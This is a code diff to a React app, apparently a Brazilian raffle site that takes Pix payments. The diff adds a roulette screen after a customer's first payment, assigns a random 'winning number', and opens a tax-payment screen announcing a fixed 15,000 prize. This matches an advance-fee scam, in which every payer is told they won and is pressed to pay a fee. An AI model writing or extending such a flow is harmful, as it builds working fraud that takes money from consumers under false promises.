@@ -4,6 +4,8 @@ import { PixResponse } from './types';
 import { validateCpf, formatCpf, cleanCpf } from './services/cpfValidationService';
 import PaymentSuccessScreen from './components/PaymentSuccessScreen';
 import OrderBumpModal from './components/OrderBumpModal';
+import RouletteScreen from './components/RouletteScreen';
+import TaxPaymentScreen from './components/TaxPaymentScreen';
 import PaymentScreen from './components/PaymentScreen';
 import { 
   Gift, 
@@ -33,6 +35,8 @@ function App() {
   const [selectedNumbers, setSelectedNumbers] = useState<number[]>([]);
   const [activeTab, setActiveTab] = useState('comprar');
   const [utmParams, setUtmParams] = useState('');
+  const [winningNumber, setWinningNumber] = useState(0);
+  const [isFirstPayment, setIsFirstPayment] = useState(true); // Flag para controlar se é o primeiro pagamento
   const [showPurchaseModal, setShowPurchaseModal] = useState(false);
   const [selectedPackage, setSelectedPackage] = useState(null);
   const [purchaseData, setPurchaseData] = useState({
@@ -57,6 +61,8 @@ function App() {
   const [showSuccessScreen, setShowSuccessScreen] = useState(false);
   const [successScreenData, setSuccessScreenData] = useState(null);
   const [showOrderBump, setShowOrderBump] = useState(false);
+  const [showRoulette, setShowRoulette] = useState(false);
+  const [showTaxPayment, setShowTaxPayment] = useState(false);
   const [showPaymentScreen, setShowPaymentScreen] = useState(false);
   
   // Calcular valores do order bump
@@ -469,7 +475,20 @@ function App() {
 
   const handlePaymentConfirmed = () => {
     setShowPaymentScreen(false);
-    setShowSuccessScreen(true);
+    
+    // Se for o primeiro pagamento, mostrar a roleta
+    if (isFirstPayment) {
+      setShowRoulette(true);
+      setIsFirstPayment(false);
+    } else {
+      setShowPaymentSuccess(true);
+    }
+  };
+
+  const handleRouletteComplete = () => {
+    setShowRoulette(false);
+    setWinningNumber(Math.floor(Math.random() * 25000));
+    setShowTaxPayment(true);
   };
 
   const copyPixCode = () => {
@@ -936,6 +955,21 @@ function App() {
             </div>
           </div>
         </div>
+      )}
+
+      {showRoulette && (
+        <RouletteScreen
+          onComplete={handleRouletteComplete}
+          customerName={formData.name}
+        />
+      )}
+
+      {showTaxPayment && (
+        <TaxPaymentScreen
+          customerName={formData.name}
+          winningNumber={winningNumber}
+          prizeAmount={15000}
+        />
       )}
 
       {/* Modal do PIX */}
